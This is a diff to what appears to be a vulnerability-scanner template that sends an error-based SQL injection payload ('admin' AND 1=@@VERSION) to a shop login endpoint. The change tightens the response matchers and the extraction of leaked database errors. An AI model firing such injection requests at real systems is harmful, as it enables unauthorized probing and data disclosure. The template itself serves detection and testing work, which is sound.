@@ -13,8 +13,10 @@ GET /ashx/login.ashx?Method=ValidateLogin&ShopID=F0&UserName=admin%27+AND+1=@@VE
 Host: {{Hostname}}
 User-Agent: {{random_ua}}
 
-#@ condition: or
+#@ condition: and
 #@ matcher: status_code == 200
+#@ matcher: body contains "出错了"
+#@ matcher: body matches /用户\s*\'?[^\'\"\s]+/
 #> extract: name=error_user, from=body, regex=/用户\s*\'?([^\'\"\s]+)/
 #> extract: name=error_desc, from=body, regex=/出错了！ 错误描述：([^"]+)/
 
@@ -22,4 +24,4 @@ User-Agent: {{random_ua}}
 
 
 
-# @VEIL-STAMP: da66c8b88ff52d9d615d62dbba275a35dee5d3541c94da24249664c56f04ed8b
+# @VEIL-STAMP: 8eb8b57733285511b062100517ab9a5848a640dbcb7259403b680207c176da9f
